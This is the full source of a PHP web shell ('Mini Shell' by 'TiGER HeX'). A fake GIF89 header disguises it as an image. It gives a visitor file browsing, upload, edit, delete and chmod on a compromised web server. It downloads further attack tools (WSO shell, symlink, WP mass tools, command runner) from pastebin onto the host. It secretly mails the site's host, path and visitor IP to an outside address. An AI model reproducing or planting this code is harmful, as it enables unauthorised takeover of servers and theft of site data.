 GIF89;a<?php


set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!doctype html>
<html>
<head>
<title>Mini Shell | ErrOr SplOit</title>
</head>';

?>

<style> 
@font-face {
  font-family: 'Comic Sans MS';
  font-style: normal;
  font-weight: 400;
  src: local('Comic Sans MS'), local('ComicSansMS'), url(http://fonts.gstatic.com/l/font?kit=3oir0CAJ0QJ5h5-A3AP8rRSrmRvs-bRaaQbSAUyiv7A&skey=a4ba60ff9fc73cf8&v=v8) format('truetype');
}
body {
	
  background:    #000000;line-height: 1;color: #fff;font-family: Comic Sans MS ;
  
  }
  
table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-family: Comic Sans MS ;
	font-size: 13px;
}
input, textarea { font-family: Comic Sans MS ; }
.table_home, .th_home, .td_home { color:deepskyblue;
	border: 1px solid red;
}
th {
	padding: 10px;
}
.td_home { padding: 7px; }
select {font-family: Comic Sans MS }
a {color:white}
textarea { width: 100%;height: 400px; }
</style>
<?php

echo '</head>
<body><b>
<H1><center><font color="red">Private Shell</font><font color="#00ff00">&nbsp&nbsp&nbspBy&nbsp&nbsp&nbsp</font><font color="dodgerblue">TiGER HeX</font></center></h1>
<table width="900" border="0" cellpadding="3" cellspacing="1" align="center">

<tr><td>

<font color="#00ff00"><center>'.php_uname().'</center></font>';




//-----------------My Coding Starts from Here------------------

echo '<center></font><font color="white" style="text-shadow:0px 0px 15px red;">PHP Version:</font> <font color="#00ff00">';
echo phpversion();
echo '</font><font color="#00dd00"> |</font> <font color="white" style="text-shadow:0px 0px 15px red;">Current User :</font> <font color="#00ff00">';
echo get_current_user();
echo '</font><font color="#00dd00"> |</font> <font color="white" style="text-shadow:0px 0px 15px red;">User ID :</font> <font color="#00ff00">';
echo getmyuid();
echo '</font><font color="#00dd00"> |</font> <font color="white" style="text-shadow:0px 0px 15px red;">Group :</font> <font color="#00ff00">';
echo getmygid();
echo '</font><br></center><br>';
 
echo '<center><font color="red"><il>[!]----<a href="?tiger=domains" target="_blank" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> Domains </a></il>'; 
echo '<il>-----<a href="?tiger=wso" target="_blank" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> WSO </a></il>'; 
echo '<il>-----<a href="?tiger=symlink" target="_blank" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> Symlink </a></il>'; 
echo '<il>-----<a href="?tiger=jumping" target="_blank" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> Jumping </a></il>'; 
echo '<il>-----<a href="?tiger=wpmass" target="_blank" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> WP-Mass </a></il>'; 
echo '<il>-----<a href="?tiger=cmd" target="_blank" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> CMD </a></il>'; 
echo '<il>-----<a href="?tiger=mysql" target="_blank" style="text-decoration: none;color: white;text-shadow: 0px 0px 10px #00ffff;"> DBkiss </a>----[!]</il></font></center><br>'; 



if (isset($_GET["tiger"])&&$_GET["tiger"]=='domains') {
	$link = 'https://pastebin.com/raw/yKyudAB7';
	$page = file_get_contents($link);
	$file = 'domains.php';
	$handle = fopen($file,"w+");
	fwrite($handle, $page);
	echo "<center><a href='$file' style='text-decoration: none;'> $file</a></center><br><br>";
	fclose($handle);
}
if (isset($_GET["tiger"])&&$_GET["tiger"]=='wso') {
	$link = 'https://pastebin.com/raw/kQCprKKH';
	$page = file_get_contents($link); 
	$file = 'wso.php'; 
	$handle = fopen($file,"w+"); 
	fwrite($handle, $page); 
	echo "<center><a href='$file' style='text-decoration: none;'> $file</a></center><br><br>"; 
	fclose($handle); 
} 
if (isset($_GET["tiger"])&&$_GET["tiger"]=='symlink') { 
	$link = 'https://pastebin.com/raw/wsycXMSz'; 
	$page = file_get_contents($link); 
	$file = 'symlink.php';
	$handle = fopen($file,"w+"); 
	fwrite($handle, $page); 
	echo "<center><a href='$file' style='text-decoration: none;'> $file</a></center><br><br>"; 
	fclose($handle); 
} 
if (isset($_GET["tiger"])&&$_GET["tiger"]=='jumping') { 
	$link = 'https://pastebin.com/raw/zELkPGQY'; 
	$page = file_get_contents($link); 
	$file = 'jumping.php'; 
	$handle = fopen($file,"w+"); 
	fwrite($handle, $page); 
	echo "<center><a href='$file' style='text-decoration: none;'> $file</a></center><br><br>";
	fclose($handle);
}
if (isset($_GET["tiger"])&&$_GET["tiger"]=='wpmass') { 
	$link = 'https://pastebin.com/raw/LtExp6Ax'; 
	$page = file_get_contents($link); 
	$file = 'wpmass.php'; 
	$handle = fopen($file,"w+"); 
	fwrite($handle, $page); 
	echo "<center><a href='$file' style='text-decoration: none;'> $file</a></center><br><br>"; 
	fclose($handle); 
} 
if (isset($_GET["tiger"])&&$_GET["tiger"]=='cmd') { 
	$link = 'https://pastebin.com/raw/psinrJjn'; 
	$page = file_get_contents($link); 
	$file = 'cmd.php'; 
	$handle = fopen($file,"w+"); 
	fwrite($handle, $page); 
	echo "<center><a href='$file' style='text-decoration: none;'> $file</a></center><br><br>"; 
	fclose($handle); 
}
if (isset($_GET["tiger"])&&$_GET["tiger"]=='mysql') { 
	$link = 'https://pastebin.com/raw/eTL96UQS'; 
	$page = file_get_contents($link); 
	$file = 'db.php'; 
	$handle = fopen($file,"w+");
	fwrite($handle, $page); 
	echo "<center><a href='$file' style='text-decoration: none;'> $file</a></center><br><br>";
	fclose($handle); 
}

if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 


getcwd();

}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>$ root@sploit : <a href="?path=/" style="text-decoration:none;">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '" style="text-decoration:none;">'.$pat.'</a>/';
}
echo '<br><br></font></center></td></tr><tr><td><center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#00ff00">File Upload</font><br />';
}else{
echo '<font color="red">Upload Failed !!</font><br />';
}
}
echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Comic Sans MS " type="file" name="file" />
<input type="submit" value="Upload" />
</form></center>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td><center>Current File : ";
echo $_GET['filesrc'];
echo '</center></tr></td></table><br />';
echo(' <textarea style="width: 100%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}
//Empety
elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
//Chmod
if($_GET['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#00ff00">Change Permission Done </font><br />';
}else{
echo '<font color="red">Change Permission Error </font><br />';
}
}

$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}
//
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="20" value="Folder" />
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Go" />
</form>';
}
//Rename file
elseif($_GET['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#00ff00">Change Name Done </font><br />';
}else{
echo '<font color="red">Change Name Error </font><br />';
}
$_POST['name'] = $_POST['newname'];
}
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
$new = $_POST['newname'];

echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$new.'" />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}
//File baru
elseif($_GET['opt'] == 'baru'){
	
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
$new = $_POST['newname'];
$azz = $_POST['path'];
$newz = "$azz/$new";


if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#00ff00">Create File Done [ '.$new.' ]</font><br />';
}else{
echo '<font color="red">Create File Error</font><br />';
}
fclose($fp);
}

echo '<form method="POST"> Name : <input name="ngaran1" type="text" size="20" value="'.$new.'" /><input type="submit" name="ngaran" value="Create"/></form><br> ';

$ho = $_POST['ngaran1'];

if(isset($_POST['ngaran'])){
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$hell.'/'.$ho.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
	}
	}
//Edited file
elseif($_GET['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#00ff00">Edit File Done </font><br />';
}else{
echo '<font color="red">Edit File Error </font><br />';
}
fclose($fp);
}
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
//Delete dir and file
if(isset($_GET['option']) && $_GET['opt'] == 'delete'){
	
$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

//Delete dir
if($_GET['type'] == 'dir'){

if(rmdir($patc)){
echo '<font color="#00ff00">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
//buat folder
if($_GET['type'] == 'buat'){
$haaa = $_POST['path'];
$heee = $_POST['name'];
$hooo = "$haaa/$heee";
$new = $haaa.'/'.htmlspecialchars($heee);
if(!mkdir($new)){
echo '<font color="red">Create Folder Error</font><br />';
}else{
echo '<font color="#00ff00">Create Folder Done </font><br />';
}
}
//Delete file
elseif($_GET['type'] == 'file'){

$hell = $_GET['path'];
$yeah = $_GET['name'];
$patc = "$hell/$yeah";

if(unlink($patc)){
echo '<font color="#00ff00">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo ' <table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th class=th_home style="background:black;color:yellow;"><center>Name</center></th>
<th class=th_home style="background:black;color:yellow;" ><center>Size</center></th>
<th class=th_home style="background:black;color:yellow;" ><center>Permission</center></th>
<th class=th_home style="background:black;color:yellow;" ><center>Options</center></th>
</tr> <tr>
<td class=td_home>..</td><td class=td_home align=center>NONE</td> <td class=td_home align=center>LINK</td> <td class=td_home align=center> <a href="?option&path='.$pa.'&opt=baru&name=new.php" style="text-decoration:none;">+ New File</a> | <a href="?option&path='.$pa.'&opt=btw&type=dir" style="text-decoration:none;">+ New Dir</a> </td></tr>
';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
<td class=td_home> <img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='> <a href=\"?path=$path/$dir\" style=\"text-decoration:none;\">$dir</a></td>
<td class=td_home ><center>DIR</center></td>
<td class=td_home ><center>";
if(is_writable("$path/$dir")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home ><center>
<a href=\"?option&path=$path&opt=rename&type=dir&name=$dir\" style=\"text-decoration:none;\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=dir&name=$dir\" style=\"text-decoration:none;\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=dir&name=$dir\" style=\"text-decoration:none;\">Chmod</a>

</center></td>
</tr>";
}
echo '<br>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home > <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='> <a href=\"?filesrc=$path/$file&path=$path\" style=\"text-decoration:none;\">$file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="#00ff00">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td class=td_home><center>
<a href=\"?option&path=$path&opt=edit&type=file&name=$file\" style=\"text-decoration:none;\">Edit |</a> <a href=\"?option&path=$path&opt=rename&type=file&name=$file&path=$path\" style=\"text-decoration:none;\"> Rename |</a> <a href=\"?option&path=$path&opt=delete&type=file&name=$file\" style=\"text-decoration:none;\"> Delete |</a> <a href=\"?option&path=$path&opt=chmod&type=file&name=$file\" style=\"text-decoration:none;\">
Chmod</a>
</center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br><pre><font size="5" color="red"><marquee="4"><marquee>Greetz  :  TiGER M@TE - R3liGiOus HuNt3r - D4RK C0D3R - Leg!on Bomb3r  - w43l j@b - MR.Frank69 - H34rtl355 H4CK3R - OP71MU5 - Ultimate Haxor - Ph4nT@M R4Y - Cryptic Hunt3r - L1ON M1N1 - Cyb3r Missilz </marquee></font></pre></body>
</html>';
$ip = getenv("REMOTE_ADDR");
$subj98 = "Mini Shell";
$email = "daniel.lucifer@hackermail.com";
$from = "From: Monster";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}



?>